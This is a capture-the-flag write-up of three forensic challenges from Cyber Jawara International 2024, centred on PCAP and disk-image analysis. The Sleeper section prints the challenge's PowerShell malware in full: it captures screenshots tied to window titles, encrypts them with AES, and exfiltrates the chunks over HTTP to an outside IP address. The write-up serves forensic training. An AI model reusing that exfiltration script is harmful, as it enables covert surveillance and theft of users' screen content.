# Cyber Jawara International 2024 - Forensic Challenges
- Played with TCP1P x SNI x MAGER

## Solved Forensic Challs:
| Name | Topic | Author |
|------------------------------|--------------|--------------|
| Sleeper | Incident Response | Blacowhait |
| Prepare the Tools | PCAP | Blacowhait |
| P2PWannabe | PCAP | Blacowhait |

## Sleeper
<img src="https://hackmd.io/_uploads/HkFeLtneyx.png" width="300" height="300">

This challenge gives us 2 distribution file which is a disk drive dump (.ad1) and a pcap file of the network traffic of the attacked device.
From the description, the chall says that we need to analyze what happened to the victim's pc.

From the given .ad1, i  mounted it using FTK and Analyze with Autopsy.
There are a .bat file but it seems has no correlation to anything, it might be an entrypoint of the malware but its just there to remove the malware.
![Screenshot 2024-10-27 092024](https://hackmd.io/_uploads/ByrHIYhl1x.png)
So, whats next? we need to find out some artifacts related to recently ran apps and installed apps.

There is an artifact named ActiviesCache.db which  is a database that stores activity history for the Windows Timeline feature, which was introduced in Windows 10. Windows Timeline lets users view and resume activities (like files opened, websites visited, or apps used) across multiple devices connected to their Microsoft account.

This artifact usually located at
``\Users\[username]\AppData\Local\ConnectedDevicesPlatform\L.<SomeID>\ActivitiesCache.db``

The database logs activities to create a timeline that users can view by pressing Windows Key + Tab. This timeline helps users quickly resume tasks or revisit activities across devices. It includes information like timestamps, application IDs, file paths, URLs, and metadata about the user's activities on that device. The data can be synchronized with other Windows devices if logged in with the same Microsoft account.

This database file we can open it with SQLite Database Viewer and then export it as csv. Here i opened the csv using Timeline Viewer
![Screenshot 2024-10-27 095217](https://hackmd.io/_uploads/SymPUt3l1g.png)
We can notice that there are some malicious execution of sconsvr.scr that we can check what is that about.

I try to search for it and found the Executable at SysWOW64, it contains this malicious powershell script
```
  function Encrypt-File {
    param (
        [string]$D783C0,
        [string]$6766A9,
        [string]$92EE28
    )

    Write-Output $6766A9
    Write-Output $92EE28

    $4099D1 = [System.Text.Encoding]::UTF8.GetBytes($6766A9)
    $68263A = [System.Text.Encoding]::UTF8.GetBytes($92EE28)

    if ($4099D1.Length -ne 16 -and $4099D1.Length -ne 24 -and $4099D1.Length -ne 32) {
        throw "ERROR"
    }
    if ($68263A.Length -ne 16) {
        throw "ERROR"
    }

    $88DB2B = New-Object "System.Security.Cryptography.AesManaged"
    $88DB2B.Key = $4099D1
    $88DB2B.IV = $68263A
    $88DB2B.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $88DB2B.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $BDAE58 = [System.IO.File]::ReadAllBytes($D783C0)

    $FF85F8 = $88DB2B.CreateEncryptor()
    $42B0F0 = $FF85F8.TransformFinalBlock($BDAE58, 0, $BDAE58.Length);
    [byte[]] $C81F44 = $88DB2B.IV + $42B0F0
    $88DB2B.Dispose()
    $res = [Convert]::ToBase64String($C81F44)
    return $res
}

# $processArray = Get-Process | Where-Object {$_.mainWindowTitle} | Select-Object ProcessName
$processArray = Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object MainWindowTitle

foreach ($process in $processArray) {
    $tmp = $process.MainWindowTitle
    $filePath = "C:\Users\Public\Pictures\tmp.png"
    $command = "C:\Windows\SysWOW64\chkmnt.exe $filepath $tmp"
    Invoke-Expression $command

    $regValue = "HKCU:\Control Panel\Desktop"
    $value = (Get-ItemProperty -Path $regValue -Name "ScreenSaveTimeout")."ScreenSaveTimeout"
    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $key = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })
    Write-Output $key

    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $IV = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })

    $base64Encoded = Encrypt-File $filePath $key $IV
    $base64Encoded = $base64Encoded[2]
    $chunkSize = 1024
    $totalChunks = [math]::Ceiling($base64Encoded.Length / $chunkSize)
    $baseUrl = 'http://10.21.69.4:8081'

    for ($i = 0; $i -lt $totalChunks; $i++) {
        $startIndex = $i * $chunkSize; $length = [math]::Min($chunkSize, $base64Encoded.Length - $startIndex)
        $chunk = $base64Encoded.Substring($startIndex, $length)
        $chunkUrlEncoded = [System.Net.WebUtility]::UrlEncode($chunk)
        $fullUrl = "${baseUrl}?vBRqSiWY$i=$chunkUrlEncoded"
    Write-Output $fullUrl
        $response = Invoke-RestMethod -Uri $fullUrl -Method Get
    }

    Remove-Item -Path $filePath
}
```

Its encrypt data using randomized key and IV with seed taken from the registry, send it to the baseUrl with that we can trace from the pcap file.

The data that was sent is splitted into 1024 bytes, so you need to combine it, there are pattern in the parameter here `?vBRqSiWY$i`, with i as index.

`tshark -r .\needsleeppls.pcap -Y '((ip.src == 10.21.69.8) && (_ws.col.protocol == "HTTP")) && (_ws.col.info contains "vBRqSiWY")' -T fields -e _ws.col.info | Out-File output.txt`

Script to tidy up the ct (credit to 53buahapel)
``` # tshark -r .\needsleeppls.pcap -Y '((ip.src == 10.21.69.8) && (_ws.col.protocol == "HTTP")) && (_ws.col.info contains "vBRqSiWY")' -T fields -e _ws.col.info | Out-File output1.txt -Encoding utf8

file = open('output1.txt', 'r').readlines()

# uncomment ini kalo tshark nya di windows encoding issue :sob:
file[0] = file[0][3:]

data = []

pattern = []
for i in range(0, len(file)):
    chunk_num = file[i].split('=')[0][14:]
    data.append(file[i].split('=')[1].split(" ")[0])
    if chunk_num == '0':
        pattern.append(i)

pattern.append(len(file))

patterns = []
for i in range(0, len(pattern) - 1):
    patterns.append((pattern[i], pattern[i + 1]))

result = []
for i in patterns:
    tmp = ""
    for j in range(i[0], i[1]):
        tmp += data[j]
    result.append(tmp)

for i in range(len(result)):
    open('result' + str(i) + '.txt', 'w').write(result[i])
``` 
Pcap containing encrypted packet:
``` ((ip.src == 10.21.69.8) && (_ws.col.protocol == "HTTP")) && (_ws.col.info contains "?vBRqSiWY")```
![Screenshot 2024-10-27 103125](https://hackmd.io/_uploads/rJCoLFhl1l.png)

Registry value for seed:
![Screenshot 2024-10-27 115126](https://hackmd.io/_uploads/rkY18t2e1x.png)

i take the key and iv using ps1 script and decrypt it manually using cyberchef
```
$seed = 60

$random = [System.Random]::New($seed)
$characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

$keyLength = 16
$key = -join ((1..$keyLength) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })

Write-Output "key: $key"

$IV = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })

Write-Output "iv: $IV"
```

```
key: EarWS9whYYeT2q8f
iv: FMShwjI9jHg1HYUP
```

Decryption Result:
![Screenshot 2024-10-27 115211](https://hackmd.io/_uploads/ryxfOF2xJg.png)

Remove the pad, and try to decrypt the packets until you got the flag
![5](https://hackmd.io/_uploads/S1VHdF3gke.png)


## Prepare the Tools
<img src="https://hackmd.io/_uploads/SkiwwY2l1x.png" width="500" height="300">

Upon analzyng the pcap, its clear enough we just need to reconstruct the scrambled flag
![Screenshot 2024-10-27 130656](https://hackmd.io/_uploads/BktowYhg1l.png)

```
import re

def parse_and_order_flag(file_path):
    # Read file contents
    with open(file_path, 'r') as file:
        data = file.read()

    # Extract each 'flag[number]' and the associated string using regex
    pattern = re.compile(r'flag\[(\d+)\](.)')
    matches = pattern.findall(data)

    # Convert each match to (number, character) and sort by number
    ordered_segments = sorted(matches, key=lambda x: int(x[0]))

    # Join the characters in the correct order to form the flag
    reconstructed_flag = ''.join(char for _, char in ordered_segments)
    return reconstructed_flag

#Usage
file_path = 'tools.dat'
flag = parse_and_order_flag(file_path)
print("Recovered flag:", flag)
```
![Screenshot 2024-10-27 130752](https://hackmd.io/_uploads/BJvADY3lkg.png)

## P2PWannabe
 ![image](https://github.com/user-attachments/assets/fc25ef6f-fafc-4050-a972-b6d8f65410c3)

The chall says its some kind of custom protocol made by combining P2P and multiplex. So basically its just transferred data but uses some kind of channeling. But here we dont know how it customed so we need to analyze the transferred packet.
![image](https://github.com/user-attachments/assets/f6aad607-e2db-4f83-a0ff-2ddb5682369e)

If we follow the tcp stream it will gives us some kind of so many raw data. I noticed that it was the packets that transferred but we need to separate it by its channels and see how it transferred the data.
 ![image](https://github.com/user-attachments/assets/2aa0d1fc-e23c-4087-ac1b-06fd4e39049e)

Extracts the only transferred data, and i examine it with notepad++
I examine it with hxd, upon analyzing it i notices that it was compressed using zlib compression method 
![image](https://github.com/user-attachments/assets/713b7b81-b9ac-4f6f-8899-39b2c5b9d060)

You can notice from the file header with 78 9c magic byte
(https://stackoverflow.com/questions/9050260/what-does-a-zlib-header-look-like)

So we need to separate the files and maybe try to learn what is the hexes before the header magic bytes about
 Upon examining, we can saw before the magic byte around 8-10 bytes that are maybe a checksum and index
 ![image](https://github.com/user-attachments/assets/a934a501-ed8d-4452-a620-b0f829cffef9)

We can try a craft a script to tidy up the file based on the index with that assumption
`decode.py`
```
import re
import os

def read_and_split_file(input_file):
    # Read hex data from the input file
    data = open(input_file, 'rb').read().hex()
   
    # Pattern to split by '00010000' + 4 hex chars (index)
    pattern = r'00010000([0-9a-fA-F]{4})'
    segments = re.split(pattern, data)
   
    # The split pattern will give alternating matches of indices and data segments
    # We need only the segments (odd indices), and indices (even indices starting from 1)
    indices = [int(segments[i], 16) for i in range(1, len(segments), 2)]
    data_segments = [segments[i] for i in range(2, len(segments), 2)]
   
    # Combine and sort the segments by their index
    indexed_data = sorted(zip(indices, data_segments), key=lambda x: x[0])
    return indexed_data

def save_segments(indexed_data, output_dir):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
       
    for index, segment in indexed_data:
        # Save each segment as hex in a new file based on index order
        file_path = os.path.join(output_dir, f'segment_{index}.txt')
        with open(file_path, 'w') as f:
            f.write(segment)
   
    print(f"Segments saved in {output_dir}")

# Run the functions
input_file = 'raw.dat'
output_dir = 'output_segments'
indexed_data = read_and_split_file(input_file)
save_segments(indexed_data, output_dir)
```
![image](https://github.com/user-attachments/assets/cfb259d0-942f-42ba-8314-638d9a791658)

We try to parse it, and yes, we are correct, we found a png in the zlib compressed data.
Now we can try to extract it all

```
import os
import zlib

def decompress_hex_files(input_dir, output_dir='flag'):
    # Ensure the output directory exists
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
   
    # Iterate over each .txt file in the input directory
    for filename in os.listdir(input_dir):
        if filename.endswith('.txt'):
            file_path = os.path.join(input_dir, filename)
            # Read hex data from the file
            with open(file_path, 'r') as f:
                hex_data = f.read().strip()
           
            try:
                # Convert hex to binary data
                binary_data = bytes.fromhex(hex_data)
                # Decompress using zlib
                decompressed_data = zlib.decompress(binary_data)
                # Define output file path (use same name but .txt extension)
                output_file_path = os.path.join(output_dir, f"{os.path.splitext(filename)[0]}_decompressed.png")
                # Write decompressed data to output file
                with open(output_file_path, 'wb') as out_f:
                    out_f.write(decompressed_data)
               
                print(f"Decompressed and saved: {output_file_path}")
           
            except zlib.error as e:
                print(f"Error decompressing {filename}: {e}")
            except ValueError as e:
                print(f"Error processing {filename} (invalid hex?): {e}")

# Run the function
input_dir = 'output_segments'  # Replace with the path to your .txt files
decompress_hex_files(input_dir)
```
 ![image](https://github.com/user-attachments/assets/e3314a51-e127-4254-ad92-11711bb69d07)

Now we can convert it into texts, because its maybe a hex string.
By calculating md5, we will determine the value to extract the string from the image
```
import os
import hashlib
import shutil

def calculate_md5(file_path):
    # Calculate MD5 hash of a file
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def find_md5_and_copy_files(folder_path, output_file="md5_hashes.txt", copy_folder="unique_md5_files"):
    # Dictionary to store unique MD5 hashes and filenames
    md5_dict = {}

    # Create a new folder if it doesn't exist
    if not os.path.exists(copy_folder):
        os.makedirs(copy_folder)

    # Iterate through all PNG files in the folder
    for filename in os.listdir(folder_path):
        if filename.endswith(".png"):
            file_path = os.path.join(folder_path, filename)
           
            # Calculate MD5 hash for the file
            md5_hash = calculate_md5(file_path)
           
            # Store only the first occurrence of each unique MD5 hash
            if md5_hash not in md5_dict:
                md5_dict[md5_hash] = filename
                print(f"Unique MD5 for {filename}: {md5_hash}")
               
                # Copy the file to the new folder
                shutil.copy(file_path, os.path.join(copy_folder, filename))
   
    # Write all unique hashes and filenames to the output file
    with open(output_file, "w") as file:
        for md5_hash, filename in md5_dict.items():
            file.write(f"{md5_hash} - {filename}\n")

# Usage
find_md5_and_copy_files("flag")
```
 ![image](https://github.com/user-attachments/assets/76c1ba6a-450f-4e1d-ae0b-a0fe90ef3e3f)
 ![image](https://github.com/user-attachments/assets/e793ddcc-d0c2-481d-9ff2-13dfdb667d82)


And then, we use it to map the char and print it
`solv.py`

```
import os
import hashlib
import re

def calculate_md5(file_path):
    # Calculate MD5 hash of a file
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def map_md5_and_save(folder_path, output_file="mapped_md5_results.txt"):
    # Mapping dictionary for single-character assignment based on provided mappings
    char_mapping = {
        "3f1b8eb1f4800f45d520c6421e5f95a8": "5",
        "0477802c4ee9c8a3bc07bec21cabea2e": "7",
        "9fc4c0e3a150c2ee9b863fe594cdadb1": "6",
        "2c2fbe0d9f8619df57b8066e7ead918f": "1",
        "ac024a04316abb204666eb14e8316175": "e",
        "d3d1b1ab0ddde68a1ddad681b99ecbab": "f",
        "6fa72bf8c7f44e256fd84ed23dd38e80": "d",
        "5c665116f130ab7e4ff92382e6e8bbd0": "b",
        "8aa8828b3d9680689d76beb92856bcde": "8",
        "66383e5bca6b7eb5cd0b38a7ebe02056": "4",
        "80d3151bf7f3fb0d8eaf0ee7f00ae0ce": "9",
        "84943ec5194aa6d8737d01f203b37f77": "3",
        "9a8f824dd9b54653d85fa01267d8893e": "0",
        "bf5241778a11df8ae8c74f4f5bfc3074": "2",
        "bae8bc98d8ae81724957cfd7839f19ea": "c",
        "08956ea8b94480aa04d1874729724e0d": "a"
    }
   
    # Initialize the flag variable
    flag = ""

    # Collect PNG files in the specified folder
    png_files = [f for f in os.listdir(folder_path) if f.endswith(".png")]

    # Sort the files numerically based on the segment number
    png_files.sort(key=lambda x: int(re.search(r'\d+', x).group()))  # Extract and convert number for sorting

    # Open output file to write only the mapped results
    with open(output_file, "w") as file:
        # Iterate through PNG files in sorted order
        for filename in png_files:
            file_path = os.path.join(folder_path, filename)
           
            # Calculate MD5 hash for the file
            md5_hash = calculate_md5(file_path)
           
            # Write only if the MD5 hash is in the predefined mapping
            if md5_hash in char_mapping:
                character = char_mapping[md5_hash]
                file.write(f"{character}")
                print(f"Unique MD5 for {filename}: {md5_hash} - {character}")
                flag += character

    # Convert the flag from hex string to ASCII
    ascii_flag = bytes.fromhex(flag).decode('utf-8')
    print(f"Constructed flag (ASCII): {ascii_flag}")

# Usage
map_md5_and_save("flag")
```
![Screenshot 2024-10-27 222202](https://github.com/user-attachments/assets/8873b06f-1ec3-4606-8afd-ce9783f2c0a0)
